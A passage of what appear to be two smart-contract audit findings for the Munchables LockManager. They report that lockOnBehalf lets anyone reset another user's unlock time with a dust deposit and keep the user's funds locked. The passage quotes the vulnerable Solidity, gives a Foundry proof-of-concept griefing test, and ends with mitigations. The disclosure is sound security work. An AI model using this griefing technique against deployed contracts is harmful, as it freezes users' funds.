        }


        lockedToken.remainder = remainder;
        lockedToken.quantity += _quantity;
        lockedToken.lastLockTime = uint32(block.timestamp);
        lockedToken.unlockTime =
            uint32(block.timestamp) +
            uint32(_lockDuration);


        // set their lock duration in playerSettings
        playerSettings[_lockRecipient].lockDuration = _lockDuration;


        emit Locked(
            _lockRecipient,
            _tokenOwner,
            _tokenContract,
            _quantity,
            remainder,
            numberNFTs,
            _lockDuration
        );
    }
```
- The only checks performed will be if the account is registered, if the victim address is their main account and if the malicious user has sent the `_amount` in the msg.value or if they've given approval to the contract for that amount depending on whether we're using native tokens or ERC20.

After that, it will continue with the standard flow and increase the user's lock period for what they've set as the lock period or for the minimum one.

- This can be repeated as many time as needed and extend the lock indefinitely, either by frontrunning `unlock` transactions or just calling `lock` at arbitrary times in order to extend the lock.
- This mechanism can also be used to frontrun the `setLockDuration()` function if it's used to shorten the already existing lock period.

Here's a coded PoC which can be used in the SpeedRun.t.sol test suite in order to test this:

```
 function testDoS() public {
        uint256 lockAmount1Wei = 1 wei;
        uint256 victimLockAmount = 5 ether;

        console.log("Beginning run()");
        deployContracts();

        // register me
        amp.register(MunchablesCommonLib.Realm(3), address(0));
        logSnuggery("Initial snuggery");

        //register victim
        vm.prank(victim);
        amp.register(MunchablesCommonLib.Realm(3), address(0));

        vm.prank(victim);
        lm.setLockDuration(15 days);

        vm.prank(victim);
        lm.lock{value: victimLockAmount}(address(0), victimLockAmount);

        vm.warp(16 days);

        lm.lockOnBehalf{value: lockAmount1Wei}(address(0), lockAmount1Wei, victim);

        vm.startPrank(victim);
        vm.expectRevert();
        lm.unlock(address(0), victimLockAmount);
        vm.stopPrank();
    }
```

## Tools Used
Manual Review

## Recommended Mitigation Steps
- When another user deposits on behalf of other user(s) to be accounted as a separate deposit which lock time/period won't affect the previous deposits.
- Allow for `lockOnBehalf()` to be called only on behalf of users which have previously approved addresses to be able to do this, something similar like allowances in terms of ERC20 tokens.


## Assessed type

DoS

# Lines of code

https://github.com/code-423n4/2024-05-munchables/blob/57dff486c3cd905f21b330c2157fe23da2a4807d/src/managers/LockManager.sol#L275-L294
https://github.com/code-423n4/2024-05-munchables/blob/57dff486c3cd905f21b330c2157fe23da2a4807d/src/managers/LockManager.sol#L297-L399


# Vulnerability details

## Impact
An attacker can manipulate users unlockTime and deny withdrawal causing critical dos.

## Proof of Concept

The protocol allows a user to lock tokens on behalf of another user using the `lockOnBehalf` function 

```solidity

   function lockOnBehalf(
        address _tokenContract,
        uint256 _quantity,
        address _onBehalfOf
    )
        external
        payable
        notPaused
        onlyActiveToken(_tokenContract)
        onlyConfiguredToken(_tokenContract)
        nonReentrant
    {
        address tokenOwner = msg.sender;
        address lockRecipient = msg.sender;
        if (_onBehalfOf != address(0)) {
            lockRecipient = _onBehalfOf;
        }

        _lock(_tokenContract, _quantity, tokenOwner, lockRecipient);
    }


```
This function calls `_lock` function that creates a lock for the particular user(lockRecipient).The vulnerability lies in the fact that the user isnt checked to see if hes calling the `_lock` function again while theres already an active lock for that particular receipient and token contract.In other words an attacker can call `_lock` again to modify the exact same lock.

see the `_lock` function below 

```solidity
function _lock(
        address _tokenContract,
        uint256 _quantity,
        address _tokenOwner,
        address _lockRecipient
    ) private {
        (
            address _mainAccount,
            MunchablesCommonLib.Player memory _player
        ) = accountManager.getPlayer(_lockRecipient);
        if (_mainAccount != _lockRecipient) revert SubAccountCannotLockError();
        if (_player.registrationDate == 0) revert AccountNotRegisteredError();
        // check approvals and value of tx matches
        if (_tokenContract == address(0)) {
            if (msg.value != _quantity) revert ETHValueIncorrectError();
        } else {
            if (msg.value != 0) revert InvalidMessageValueError();
            IERC20 token = IERC20(_tokenContract);
            uint256 allowance = token.allowance(_tokenOwner, address(this));
            if (allowance < _quantity) revert InsufficientAllowanceError();
        }

        LockedToken storage lockedToken = lockedTokens[_lockRecipient][
            _tokenContract
        ];
        ConfiguredToken storage configuredToken = configuredTokens[
            _tokenContract
        ];

        // they will receive schnibbles at the new rate since last harvest if not for force harvest
        accountManager.forceHarvest(_lockRecipient);

        // add remainder from any previous lock
        uint256 quantity = _quantity + lockedToken.remainder;
        uint256 remainder;
        uint256 numberNFTs;
        uint32 _lockDuration = playerSettings[_lockRecipient].lockDuration;
        if (_lockDuration == 0) {
            _lockDuration = lockdrop.minLockDuration;
        }
        if (
            lockdrop.start <= uint32(block.timestamp) &&
            lockdrop.end >= uint32(block.timestamp)
        ) {
            if (
                _lockDuration < lockdrop.minLockDuration ||
                _lockDuration >
                uint32(configStorage.getUint(StorageKey.MaxLockDuration))
            ) revert InvalidLockDurationError();
            if (msg.sender != address(migrationManager)) {
                // calculate number of nfts
                remainder = quantity % configuredToken.nftCost;
                numberNFTs = (quantity - remainder) / configuredToken.nftCost;

                if (numberNFTs > type(uint16).max) revert TooManyNFTsError();

                // Tell nftOverlord that the player has new unopened Munchables
                nftOverlord.addReveal(_lockRecipient, uint16(numberNFTs));
            }
        }

        // Transfer erc tokens
        if (_tokenContract != address(0)) {
            IERC20 token = IERC20(_tokenContract);
            token.transferFrom(_tokenOwner, address(this), _quantity);
        }

        lockedToken.remainder = remainder;
        lockedToken.quantity += _quantity;
        lockedToken.lastLockTime = uint32(block.timestamp);
        lockedToken.unlockTime =
            uint32(block.timestamp) +
            uint32(_lockDuration);

        // set their lock duration in playerSettings
        playerSettings[_lockRecipient].lockDuration = _lockDuration;

        emit Locked(
            _lockRecipient,
            _tokenOwner,
            _tokenContract,
            _quantity,
            remainder,
            numberNFTs,
            _lockDuration
        );
    }

```
Here we can see unlockTime for a lockedToken is set according to current timestamp and the lock duration,so basically a legit user locks his tokens, an attacker can call `lock` through `lockOnBehalf` & can manipulate the unlockTime to a value further forward withrespect to the time the function is being called.Also take into consideration that the `lock` doesnt consider a minimum quantity for lock so, the attacker can call `_lock` with a quantity that is bare minimum (zero) amount.

consider the below scenario:

- Alice calls `lock` and creates a lock for 5 days.
- Bob calls `lockOnBehalf` with Alice address as lock recipient with a low amount after say, 4 days.
- Bob succesfully increased the unlocklockTime to another 5 days(because unlock time is set with current timestamp & duration(5)).
- Essentially Bob can repeat the process to lock Alice funds further for till he desires.  

